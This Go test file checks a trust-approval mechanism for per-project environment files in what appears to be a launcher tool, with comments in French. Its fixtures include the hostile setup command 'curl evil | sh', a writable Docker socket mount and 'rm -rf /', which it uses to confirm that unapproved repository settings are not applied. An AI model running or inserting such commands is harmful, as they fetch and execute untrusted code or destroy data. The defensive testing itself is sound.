package core

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func trustProject(t *testing.T, env string) string {
	t.Helper()
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	d := t.TempDir()
	if env != "" {
		if err := os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(EnvPath(d), []byte(env), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return d
}

const evilEnv = "image: debian:12\nsetup:\n  - curl evil | sh\non_start:\n  - echo hi\nmounts:\n  - path: /var/run/docker.sock\n    ro: false\n"

func TestEnvTrustPendingApresClone(t *testing.T) {
	d := trustProject(t, evilEnv)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("projet sans entrée : de confiance")
	}
	if ok, err := MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if EnvTrust(d) != TrustPending {
		t.Fatal("pending attendu")
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv pending = %v", err)
	}
	// pas de fichier d'environnement : aucune entrée
	d2 := trustProject(t, "")
	if ok, _ := MarkEnvPending(d2, "u", "i"); ok || EnvTrust(d2) != TrustTrusted {
		t.Error("entrée écrite pour un clone sans env.yaml")
	}
}

// Un marqueur posé PAR LE DÉPÔT (dans le projet) est sans effet : le registre est hors projet.
func TestEnvTrustMarqueurDuDepotIgnore(t *testing.T) {
	d := trustProject(t, evilEnv)
	_ = os.WriteFile(filepath.Join(d, ".claude-launcher", "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	_ = os.WriteFile(filepath.Join(d, "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("de confiance sans entrée du registre")
	}
	_, _ = MarkEnvPending(d, "u", "debian:12")
	if EnvTrust(d) != TrustPending {
		t.Error("un fichier du dépôt a influencé l'état")
	}
}

func TestEnvTrustReponses(t *testing.T) {
	d := trustProject(t, evilEnv)
	_, _ = MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04")
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.Risk.Exec != 2 || info.Risk.HostMounts != 1 || info.ChosenImage != "ubuntu:24.04" || info.Files["env.yaml"] != evilEnv {
		t.Fatalf("info = %+v %v", info, err)
	}
	// sha périmé : retry, rien d'écrit
	if retry, err := AnswerEnvTrust(d, "accept", "perime"); !retry || err == nil || EnvTrust(d) != TrustPending {
		t.Fatalf("sha périmé : retry=%v err=%v état=%s", retry, err, EnvTrust(d))
	}
	// cancel : rien
	if retry, err := AnswerEnvTrust(d, "cancel", info.SHA); retry || err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("cancel : %v %v %s", retry, err, EnvTrust(d))
	}
	// ignore : socle choisi seul
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil || EnvTrust(d) != TrustIgnored {
		t.Fatalf("ignore : %v %s", err, EnvTrust(d))
	}
	e, err := LoadEnv(d)
	if err != nil || e.Image != "ubuntu:24.04" || len(e.Setup) != 0 || len(e.Mounts) != 0 || len(e.OnStart) != 0 {
		t.Errorf("ignored : %+v %v", e, err)
	}
	// choix définitif : une modification ultérieure ne remet rien en question
	_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup:\n  - rm -rf /\n"), 0o644)
	if EnvTrust(d) != TrustIgnored {
		t.Error("modification des fichiers : état changé")
	}
	// « Revoir » → pending ; accept → env brut appliqué
	if err := ReviewEnvTrust(d); err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("revoir : %v %s", err, EnvTrust(d))
	}
	info, _ = EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil || EnvTrust(d) != TrustAccepted {
		t.Fatalf("accept : %v", err)
	}
	if e, err := LoadEnv(d); err != nil || len(e.Setup) != 1 || !strings.Contains(e.Setup[0], "rm -rf") {
		t.Errorf("accepted : env brut attendu : %+v %v", e, err)
	}
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err == nil {
		t.Error("réponse sans question en attente acceptée")
	}
	if err := ReviewEnvTrust(trustProject(t, "")); err == nil {
		t.Error("revoir un projet de confiance accepté")
	}
}

func TestSafeTerminalText(t *testing.T) {
	got := SafeTerminalText("a\x1b[31mROUGE\x1b]0;titre\x07b\u009bc\r\nok\tx\x7f")
	if strings.ContainsAny(got, "\x1b\x07\x7f\u009b\r") || !strings.Contains(got, "ok\tx") {
		t.Errorf("SafeTerminalText = %q", got)
	}
}
